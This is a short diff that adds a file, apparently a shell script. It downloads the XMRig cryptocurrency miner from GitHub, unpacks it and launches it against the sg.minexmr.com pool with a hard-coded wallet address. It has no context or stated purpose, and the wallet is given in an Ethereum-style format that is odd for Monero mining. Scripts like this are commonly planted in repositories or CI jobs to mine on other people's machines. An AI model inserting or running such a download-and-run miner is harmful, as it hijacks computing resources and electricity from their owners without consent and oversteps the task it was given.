@@ -1,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:443 -u 0x919098EBA4932B68528601D5D71008c41e164B7A -k --tls --rig-id rig
